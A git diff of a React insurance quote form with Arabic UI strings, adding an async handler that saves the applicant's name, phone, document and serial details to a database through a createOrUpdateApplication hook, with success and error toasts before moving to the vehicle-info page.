@@ -14,6 +14,7 @@ import { ar } from "date-fns/locale";
 import { cn } from "@/lib/utils";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+import { useApplicationData } from "@/hooks/useApplicationData";
 
 export const QuoteForm = () => {
   const navigate = useNavigate();
@@ -25,6 +26,7 @@ export const QuoteForm = () => {
   const [phoneNumber, setPhoneNumber] = useState("");
   const [serialNumber, setSerialNumber] = useState("");
   const { toast } = useToast();
+  const { createOrUpdateApplication } = useApplicationData();
 
   // Send data to Formspree in real-time
   useFormspreeSync({
@@ -59,7 +61,7 @@ export const QuoteForm = () => {
     birthDate || new Date(1990, 0, 1)
   );
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     // التحقق من جميع الحقول
     if (!idNumber.trim()) {
       toast({
@@ -106,16 +108,33 @@ export const QuoteForm = () => {
       return;
     }
     
-    // إذا كانت جميع البيانات صحيحة
-    toast({
-      title: "تم بنجاح",
-      description: "جاري الانتقال إلى الصفحة التالية...",
-    });
-    
-    // الانتقال إلى صفحة معلومات المركبة
-    setTimeout(() => {
-      navigate("/vehicle-info");
-    }, 1000);
+    try {
+      // حفظ البيانات في قاعدة البيانات
+      await createOrUpdateApplication({
+        insurance_type: insuranceType,
+        document_type: documentType,
+        full_name: ownerName,
+        phone: phoneNumber,
+        serial_number: serialNumber,
+        current_step: 'quote_form',
+        status: 'pending'
+      });
+
+      toast({
+        title: "تم بنجاح",
+        description: "تم حفظ البيانات. جاري الانتقال إلى الصفحة التالية...",
+      });
+      
+      setTimeout(() => {
+        navigate("/vehicle-info");
+      }, 1000);
+    } catch (error) {
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء حفظ البيانات",
+        variant: "destructive",
+      });
+    }
   };
   return <section className="pt-8 pb-16 px-4 md:px-6 bg-background">
       <div className="container mx-auto max-w-2xl">
